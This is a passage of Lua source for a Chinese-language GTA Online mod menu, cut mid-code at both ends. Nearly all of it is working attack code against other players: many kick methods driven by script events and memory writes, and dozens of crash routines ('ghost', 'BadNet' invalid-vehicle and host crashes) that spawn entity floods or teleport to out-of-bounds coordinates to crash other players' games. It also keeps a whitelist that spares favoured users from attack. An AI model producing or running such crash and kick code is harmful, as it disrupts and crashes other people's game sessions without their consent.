    util.trigger_script_event(1 << pid ,{630191280, players.user(),0, math.random(-2147483646, 2147483646), math.random(-2147483646, 2147483646), 
    math.random(-2147483646, 2147483646), 0, 0, math.random(-2147483646, 2147483646), 0})
    util.trigger_script_event(1 << pid ,{728200248, players.user(),0, math.random(-2147483646, 2147483646), math.random(-2147483646, 2147483646)})
    util.trigger_script_event(1 << pid ,{921195243, players.user(),0, math.random(-2147483646, 2147483646), 0})
end
GTAC(PlayerMainMenu2, "Project踢™", {}, "",function()
    menu.trigger_commands("scripthost")
    wait()
    if players.exists(pid) and players.get_script_host() == players.user() then
        memory.write_int(memory.script_global(1877252 + (pid)), 1)
    end
end)
GTAC(PlayerMainMenu2, "忧郁踢", {}, "", function()
    scriptkick(pid)
end)
GTAC(PlayerMainMenu2, "脚本事件踢出", {}, "", function()
    menu.trigger_commands("scripthost")
    menu.trigger_commands("nonhostkick".. PLAYER.GET_PLAYER_NAME(pid))
end)
GTAC(PlayerMainMenu2, "阻止加入踢", {"blast"}, "将玩家踢出并无法加入此战局\n可在(线上-战局选项-阻止加入-已移除的玩家)中将该玩家移除", function()
    menu.trigger_commands("smart".. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("historyblock".. PLAYER.GET_PLAYER_NAME(pid))
end)
GTAC(PlayerMainMenu2, "智能", {"smartkick"}, "", function()
    GTLuaScript.trigger_commands("kick"..PLAYER.GET_PLAYER_NAME(pid))
end)
GTAC(PlayerMainMenu2, "池被关闭", {"aidskick"}, "", function()
    GTLuaScript.trigger_commands("aids"..PLAYER.GET_PLAYER_NAME(pid))
end)
GTAC(PlayerMainMenu2, "情书", {"lovekick"}, "", function()
    GTLuaScript.trigger_commands("loveletterkick"..PLAYER.GET_PLAYER_NAME(pid))
end)
GTAC(PlayerMainMenu2, "高潮", {"orgkick"}, "Blocked by popular menus.", function()
    GTLuaScript.trigger_commands("orgasmkick"..PLAYER.GET_PLAYER_NAME(pid))
end)
GTAC(PlayerMainMenu2, "黑名单", {"blacklistkick"}, "", function()
    GTLuaScript.trigger_commands("blacklist"..PLAYER.GET_PLAYER_NAME(pid))
end)
GTAC(PlayerMainMenu2, "主机", {"kickhost"}, "", function()
    GTLuaScript.trigger_commands("hostkick"..PLAYER.GET_PLAYER_NAME(pid))
end)
GTAC(PlayerMainMenu2, "非主机", {"kicknonhost"}, "", function()
    GTLuaScript.trigger_commands("nonhostkick"..PLAYER.GET_PLAYER_NAME(pid))
end)
playerpro = GT(GTROOT, "", {"GTProt"}, "")
GTD(playerpro, "!!!你无法攻击皇榜用户!!!", {"GTProt"}, "")
menu.set_visible(playerpro,false)
PlayerMainMenu = GT(GTROOT, "崩溃选项", {"GTCrash"}, "", function()
    local focused = players.get_focused()
    if #focused > 0 and menu.is_open() and (players.get_spectate_target(players.user()) ~= focused[1]) then
        local pid = focused[1]
        if pid ~= cur_focused_player then
            if not cur ~= 0 then
                entities.delete(cur)
            end
            cur_focused_player = pid
        end
        local name = PLAYER.GET_PLAYER_NAME(pid)
        for _, id in ipairs(spid) do
            if name == id.playerid then
                if name ~= "RhymeBear" then
                    gtoast("你无法对皇榜用户使用任何攻击功能")
                    menu.trigger_commands("GTProt" .. name)
                end
            end
        end
    end
end)
asap = GTAC(PlayerMainMenu, "ASAP", {}, "", function ()
end)
asap.visible = false
updates = GT(PlayerMainMenu, "推荐选项", {}, "#此选项的崩溃为中等强度及以上\n#请您不要观看并且远离崩溃对象\n#切记:请不要无脑使用,否则玩火自焚\n#注意:崩溃需要您自行研究,切莫魔怔\n\n<建议1> #偷偷告诉您,附加黑洞效果更佳喔~\n<建议2> #针对主流菜单的情况下,其实踢出是最优选择喔~")
local guibengs = menu.list(PlayerMainMenu, "鬼式崩溃", {}, "")
GTAC(guibengs, "鬼崩V1", {"ghost"}, "", function(change)
    if change then
        STREAMING.REQUEST_MODEL(-1364166376)
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local cone = OBJECT.CREATE_OBJECT_NO_OFFSET(-1364166376, c.x, c.y, c.z, true, false, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(cone, cone, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true)
        wait(500)
    end
end)
GTAC(guibengs, "鬼崩V2", {"ghostv2"}, "", function()
    guibeng(pid)
end)
GTAC(guibengs, "鬼崩V3", {"ghostv3"}, "", function()
    pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    mypos = ENTITY.GET_ENTITY_COORDS(pedp, true)
    tr2 = 2078290630
    STREAMING.REQUEST_MODEL(tr2)
    local vehicle_ = CreateVehicle(tr2, mypos,0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle_, PLAYER.PLAYER_PED_ID(), 0, 0, 0, -10, 0, 0, 0, true, false, true, false, 0, true)
    playerped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    for i = 0, 10 do
    playerpos = ENTITY.GET_ENTITY_COORDS(playerped, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), playerpos.x, playerpos.y, playerpos.z, false, false, false)
    wait(15)
    end
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mypos.x, mypos.y, mypos.z, false, false, false)
end)
GTAC(guibengs, "鬼崩V4", {"ghostv4"}, "", function()
    local model = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
    local BAD_attach = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local fuck_ped = CreatePed(26 , util.joaat("ig_kaylee"), BAD_attach, 0)
    ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
    for i = 1, 3, 1 do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, BAD_attach.x, BAD_attach.y, BAD_attach.z)
        for spawn, value in pairs(model) do
            local vels = {}
            vels[spawn] = CreateVehicle(value, BAD_attach, 0)
            for attach, value in pairs(vels) do
                ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value, fuck_ped, 0, 0, true, true)
            end
        end
        wait(500)
        notification("再见!", colors.black)
        menu.trigger_commands("explode" ..  players.get_name(pid))
        local vels_ <const> = entities.get_all_vehicles_as_handles()
        for delete, value in pairs(vels_) do
        entities.delete_by_handle(fuck_ped)
    end
    end
end)
GTAC(guibengs, "鬼崩V5", {"ghostv5"}, "", function()
    my = PLAYER.GET_PLAYER_PED(players.user())
    mypos = ENTITY.GET_ENTITY_COORDS(players.user())
    tr2 = -1881846085
    STREAMING.REQUEST_MODEL(tr2)
        while not STREAMING.HAS_MODEL_LOADED(tr2) do
            wait(1)
        end
        dell = entities.create_vehicle(tr2, mypos, 0)
        ENTITY.SET_ENTITY_VISIBLE(dell, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(dell, my, 0, 0, 0, 0, 0, 0, 0, false, true, false, true, 0, true)
        wait(400)
        for i = 1, 50 do
            youpos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my, youpos.x, youpos.y, youpos.z, true, false)
            wait(20)
        end
    wait(20)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my,-75.28,-818.66,326.17)
end)
GTAC(guibengs, "鬼崩V6", {"ghostv6"}, "", function()
        yyddss = 3613262246
        STREAMING.REQUEST_MODEL(yyddss)
        while not STREAMING.HAS_MODEL_LOADED(yyddss) do
            wait(1)
        end
        kkk = PLAYER.GET_PLAYER_PED(pid)
        kkk1 = ENTITY.GET_ENTITY_COORDS(kkk)
        ENTITY.FREEZE_ENTITY_POSITION(kkk, true)
        kkk3 = entities.create_object(yyddss, kkk1, 0)
    end)
GTAC(guibengs, "鬼崩V7", {"ghostv7"}, "#建议贴脸,效果极佳\n#允许您贴脸并且长按哟~", function()
    pedp = players.user_ped(pid)
    pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    towtruck = CreateVehicle(-1323100960, pos, 0)
    skylift = CreateVehicle(-692292317, pos, 0)
    cargobob = CreateVehicle(4244420235, pos, 0)
    cargobob2 = CreateVehicle(4244420235, pos, 0)
    cargobob1 = CreateVehicle(4244420235, pos, 0)
    handler = CreateVehicle(444583674, pos, 0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob, skylift, 0, 0, 0, 0.2, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob1, skylift, 0, 0, 0, -0.2, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(handler, skylift, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(towtruck, skylift, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob2, towtruck, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(skylift, pedp, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
end)
GTAC(guibengs, "鬼崩V8", {"ghostv8"}, "", function()
    menu.trigger_commands("choke".. PLAYER.GET_PLAYER_NAME(pid))
    local cord = getEntityCoords(getPlayerPed(pid))
    local object = entities.create_object(util.joaat("virgo"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("osiris"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_firealarm"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_bs_cond"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_bs_foamx3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor07"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor06"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor05"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_bs_gelx3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor01"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("feltzer3"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor02"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("windsor"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_ct_monitor03"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_serv_bs_clutter"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, true, true)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(object, 1, 0.0, 10000.0, 0.0, 0.0, 0.0, 0.0, false, true, true, false, true)
    ENTITY.SET_ENTITY_ROTATION(object, math.random(0, 360), math.random(0, 360), math.random(0, 360), 0, true)
    ENTITY.SET_ENTITY_VELOCITY(object, math.random(-10, 10), math.random(-10, 10), math.random(30, 50))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(object, object, 0, 0, -1, 2.5, 0, 180, 0, 0, false, true, false, 0, true)
    wait(300)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(cord.x, cord.y, cord.z + 1, cord.x, cord.y, cord.z, 0, true, util.joaat("weapon_heavysniper_mk2"), players.user_ped(), false, true, 1.0)
    ENTITY.DETACH_ENTITY(object, object)
    entities.delete_by_handle(object)
end)
oldcrash = GT(PlayerMainMenu, "经典崩溃", {}, "")
GTLP(oldcrash, "AIO崩溃", {""}, "", function()
    aaio(pid)
end)
GTAC(oldcrash, "因莎拉崩溃", {"inshell"}, "", function()
    inshellcrash(pid)
end)
GTLP(oldcrash, "悲伤的耶稣崩溃", {"grief"}, "可以崩溃大多数菜单.", function()
    greifcrash(pid)
end)
GTAC(oldcrash, "泡泡糖崩溃", {"sweetcrash"}, "", function()
    sugercrash(pid)
end)
GTAC(oldcrash, "美杜莎崩溃", {"planecrash"}, "", function()
    MDS(pid)
end)
    local invalidclothes = menu.list(PlayerMainMenu, "无效载具", {}, "")
    function clone(vehicle)
        local vehicleHeading<const> = ENTITY.GET_ENTITY_HEADING(vehicle)
        local vehicleHash<const> = ENTITY.GET_ENTITY_MODEL(vehicle)
        local coords = ENTITY.GET_ENTITY_COORDS(vehicle)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle)
        local rot = v3.toDir(ENTITY.GET_ENTITY_ROTATION(vehicle, 2))
        v3.mul(rot, -getDimensions(vehicle).x - 2)
        v3.add(coords, rot)
        local cloneVehicle<const> = entities.create_vehicle(vehicleHash, coords, vehicleHeading)
        copyVehicleData(vehicle, cloneVehicle)
        return cloneVehicle
    end
    local minimum<const> = memory.alloc()
    local maximum<const> = memory.alloc()
    function getDimensions(entity)
        MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
        local minimum_vec<const> = v3.new(minimum)
        local maximum_vec<const> = v3.new(maximum)
        local dimensions<const> = {
            x = maximum_vec.y - minimum_vec.y,
            y = maximum_vec.x - minimum_vec.x,
            z = maximum_vec.z - minimum_vec.z
        }
        return dimensions
    end
    local colorR, colorG, colorB = memory.alloc(1), memory.alloc(1), memory.alloc(1)
    function copyVehicleData(vehicle, cloneVehicle)
        VEHICLE.SET_VEHICLE_MOD_KIT(cloneVehicle, 0)
        for i = 17, 22 do
            VEHICLE.TOGGLE_VEHICLE_MOD(cloneVehicle, i, VEHICLE.IS_TOGGLE_MOD_ON(vehicle, i))
        end
        for i = 0, 49 do
            local modValue<const> = VEHICLE.GET_VEHICLE_MOD(vehicle, i)
            VEHICLE.SET_VEHICLE_MOD(cloneVehicle, i, modValue)
        end
        if VEHICLE.GET_IS_VEHICLE_PRIMARY_COLOUR_CUSTOM(vehicle) then
            VEHICLE.GET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, colorR, colorG, colorB)
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
        else
            VEHICLE.GET_VEHICLE_MOD_COLOR_1(vehicle, colorR, colorG, colorB)
            VEHICLE.SET_VEHICLE_MOD_COLOR_1(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
        end
        if VEHICLE.GET_IS_VEHICLE_SECONDARY_COLOUR_CUSTOM(vehicle) then
            VEHICLE.GET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, colorR, colorG, colorB)
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
        else
            VEHICLE.GET_VEHICLE_MOD_COLOR_2(vehicle, colorR, colorG)
            VEHICLE.SET_VEHICLE_MOD_COLOR_2(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))
        end
        VEHICLE.GET_VEHICLE_COLOURS(vehicle, colorR, colorG)
        VEHICLE.SET_VEHICLE_COLOURS(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))
        VEHICLE.GET_VEHICLE_EXTRA_COLOURS(vehicle, colorR, colorG)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG))
        VEHICLE.GET_VEHICLE_EXTRA_COLOUR_5(vehicle, colorR) -- interior
        VEHICLE.GET_VEHICLE_EXTRA_COLOUR_6(vehicle, colorG)
        VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(cloneVehicle, memory.read_ubyte(colorR)) -- dashboard
        VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(cloneVehicle, memory.read_ubyte(colorG)) -- interior
        VEHICLE.GET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
        VEHICLE.GET_VEHICLE_NEON_COLOUR(vehicle, colorR, colorG, colorB)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(cloneVehicle, memory.read_ubyte(colorR), memory.read_ubyte(colorG), memory.read_ubyte(colorB))
        for i = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(cloneVehicle, i, VEHICLE.GET_VEHICLE_NEON_ENABLED(vehicle, i))
        end
        local windowTint<const> = VEHICLE.GET_VEHICLE_WINDOW_TINT(vehicle)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(cloneVehicle, windowTint)
        local lightsColor<const> = VEHICLE.GET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehicle)
        VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(cloneVehicle, lightsColor)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(cloneVehicle, VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle))
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(cloneVehicle, VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT(vehicle))
        VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(cloneVehicle, VEHICLE.GET_VEHICLE_TYRES_CAN_BURST(vehicle))
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(cloneVehicle, VEHICLE.GET_VEHICLE_DIRT_LEVEL(vehicle))
        for i = 1, 14 do
            VEHICLE.SET_VEHICLE_EXTRA(cloneVehicle, i, not VEHICLE.IS_VEHICLE_EXTRA_TURNED_ON(vehicle, i))
        end
        local roofState<const> = VEHICLE.GET_CONVERTIBLE_ROOF_STATE(vehicle)
        if roofState == 1 or roofState == 2 then
            VEHICLE.LOWER_CONVERTIBLE_ROOF(cloneVehicle, true)
        end
        VEHICLE.SET_VEHICLE_ENGINE_ON(cloneVehicle, VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(vehicle), true, true)
        end
        GTLP(invalidclothes, "无效载具崩溃V1", {"BadNet"}, "", function()
            local pCoords<const> = players.get_position(pid)
            local trafficLights = {}
            util.request_model(-655644382) 
            for i = 1, 20 do
                local object<const> = entities.create_object(-655644382, v3.new(pCoords.x + math.random(-5, 5), pCoords.y + math.random(-5, 5), pCoords.z + math.random(-1, 0)))
                ENTITY.SET_ENTITY_ROTATION(object, 0, 0, math.random(0, 360), 1, true)
                trafficLights[#trafficLights + 1] = object
            end
            local stopLights = false
            util.create_tick_handler(function()
                if stopLights then
                    return false
                end
                ENTITY.SET_ENTITY_TRAFFICLIGHT_OVERRIDE(trafficLights[math.random(1, #trafficLights)], math.random(0, 3))
            end)
            util.request_model(3253274834)
            local vehicles = {}
            local crashVehicle<const> = entities.create_vehicle(3253274834, pCoords, 0)
            vehicles[#vehicles + 1] = crashVehicle
            VEHICLE.SET_VEHICLE_MOD_KIT(crashVehicle, 0)
            VEHICLE.SET_VEHICLE_MOD(crashVehicle, 34, 3)
            for i = 1, 10 do
                vehicles[#vehicles + 1] = clone(crashVehicle)
            end
            wait(500)
            for i = 1, #vehicles do
                entities.delete_by_handle(vehicles[i])
            end
            wait(500)
            stopLights = true
            wait(500)
            for i = 1, #trafficLights do
                entities.delete_by_handle(trafficLights[i])
            end
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3253274834)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-655644382)
        end)
    GTLP(invalidclothes, "无效载具崩溃v7", {"BadNetV7"}, "", function()
        local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)) stupid_pos.z = stupid_pos.z + 1
        util.create_thread(function ()
            local mod_vel = {0x58f77553,0x1446590a}
                for _spawn, value in pairs(mod_vel) do
                    local s = {}
                    for i = 1, 7, 1 do  
                        s[_spawn] = CreateVehicle(value,stupid_pos,0)
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
                        wait(0)
                        end
                    end
                    wait(8000)
                    local ar_vs = entities.get_all_vehicles_as_handles()
                    for key, value in pairs(ar_vs) do
                    entities.delete_by_handle(value)
                end
            end,nil)
        end)
    GTAC(invalidclothes, "无效载具崩溃v8", {"BadNetV8"}, "", function()
        local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)) stupid_pos.x = stupid_pos.x + 3
        util.create_thread(function ()
            local sb_ped <const> = entities.create_ped(26,util.joaat("a_c_rat"),stupid_pos,0)
            local mod_vel = {0x9c5e5644}
            PED.SET_PED_INTO_VEHICLE(sb_ped,-1)
            PED.SET_PED_INTO_VEHICLE(players.user_ped(players.user()),crash_plane,-1)
                for _spawn, value in pairs(mod_vel) do
                    local s = {}
                    for i = 1, 10, 1 do  
                        s[_spawn] = CreateVehicle(value,stupid_pos,0)
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
                        wait(100)
                        end
                    end
                    wait()
                    local ar_vs = entities.get_all_vehicles_as_handles(sb_ped, value, 0)
                    for key, value in pairs(ar_vs) do
                    entities.delete_by_handle(value)
                end
            end,nil)
        end)
    GTAC(invalidclothes, "无效载具崩溃v9", {"BadNetV9"}, "", function(on_toggle)
        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
        local vehicles = {}
        for i = 1, 4 do
            util.create_thread(function()
                request_model(hashes[i])
                local pcoords = players.get_position(pid)
                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
                for j = 0, 49 do
                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
                end
                for j = 0, 20 do
                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
                end
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
                for ai = 1, 50 do
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                    pcoords = players.get_position(pid)
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                    wait()
                end
                vehicles[#vehicles+1] = veh
            end)
        end
        wait(2000)
        for _, v in pairs(vehicles) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
            entities.delete_by_handle(v)
        end
    end)
    GTAC(invalidclothes,"无效载具崩溃v10",{"BadNetV10"},"",function()
    pedp = players.user_ped(pid)
    pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    dune = CreateVehicle(410882957,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(dune)
    dune1 = CreateVehicle(2971866336,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(dune1)
    barracks = CreateVehicle(3602674979,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks)
    barracks1 = CreateVehicle(444583674,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks1)
    dunecar = CreateVehicle(2971866336,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(dunecar)
    dunecar1 = CreateVehicle(3602674979,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(dunecar1)
    dunecar2 = CreateVehicle(444583674,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(dunecar2)
    barracks3 = CreateVehicle(4244420235,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks3)
    barracks31 = CreateVehicle(3602674979,pos,0)
    ENTITY.SET_ENTITY_INVINCIBLE(barracks31)
    wait(5000)
    allvehs = entities.get_all_vehicles_as_handles()
    for i = 1, #allvehs  do
        vehhash = ENTITY.GET_ENTITY_MODEL(allvehs[i])
        if vehhash == 410882957 or vehhash == -42959138 or vehhash == 2971866336 or vehhash == 3602674979 or vehhash == 2025593404 or vehhash == -1323100960 or vehhash == 444583674 then
            entities.delete_by_handle(allvehs[i])
            wait(1)
        end
    end
    end)
    local hostcrashs = GT(PlayerMainMenu, "主机崩溃", {}, "")
    GTAC(hostcrashs, "主机崩溃V1", {""}, "",function(pid)
    local deathpos = v3(-16257.853, 10793.688, 893.610)
    local pedp  = players.user_ped(players.user(pid))
    local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    ENTITY.FREEZE_ENTITY_POSITION(pedp,true)
    ENTITY.GET_ENTITY_COORDS(pedp, deathpos)
    wait(1000)
    ENTITY.FREEZE_ENTITY_POSITION(pedp,false)
    ENTITY.GET_ENTITY_COORDS(pedp,mypos)
    gtoast("主机崩溃完成",5,61000)	
    end)
    local coords_crash = true
    GTAC(hostcrashs, "主机崩溃V2", {""}, "", function(on)
    local Coords = {v3(-16257.853, 10793.688, 893.610)}
        coords_crash = on
        if not NETWORK.NETWORK_IS_HOST() then
            menu.trigger_commands("spectate" ..  players.get_name(pid).. " on")
                    while coords_crash do
                        for key, pos in pairs(Coords) do
                            for i = 1, 20, 1 do
                                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(pid),pos.x, pos.y, pos.z)
                                wait(0)
                            end
                        end
                    end
                end
            menu.trigger_commands("spectate" ..  players.get_name(pid).. " off")
    end)
    GTAC(hostcrashs, "主机崩溃V3", {}, "", function(pid)
        hostcrash(pid)
    end)
    local coords_crash = true
    GTTG(hostcrashs, "主机崩溃V4", {""}, "", function(on)
    local Coords = {
        v3(-16257, 10793, 893),
        v3(-6170,10837,40),
        v3(-1336, -3044, 13),
        v3(10837, -6170, 39),
        }
        coords_crash = on
        if not NETWORK.NETWORK_IS_HOST() then
            menu.trigger_commands("spectate" ..  players.get_name(pid).. " on")
                while coords_crash do
                    for key, pos in pairs(Coords) do
                        for i = 1, 20, 1 do
                            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(pid),pos.x, pos.y, pos.z)
                            wait(0)
                        end
                    end
                end
            end
        menu.trigger_commands("spectate" ..  players.get_name(pid).. " off")
    end)
    GTAC(hostcrashs, "主机崩溃V5", {""}, "", function()
        notification("开始崩溃", colors.pink)
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        wait(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
        wait(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
        wait(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
        wait(1000)
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        wait(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -18, 708, 243, true, false, false)
        wait(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -74, 100, 174, true, false, false)
        wait(900)
        ENTITY.SET_ENTITY_COORDS(self_ped, -101, 100, 374, true, false, false)
        wait(1000)
        menu.trigger_commands("tpmtchiliad")
        notification("结束崩溃 ", colors.pink)
    end)
GTAC(hostcrashs,"主机崩溃V6",{},"",function()
    gtoast("主机崩溃"..PLAYER.GET_PLAYER_NAME(pid),1)
    playerx = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()))
    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(players.user()),-6170,10837,39)
    wait(700)
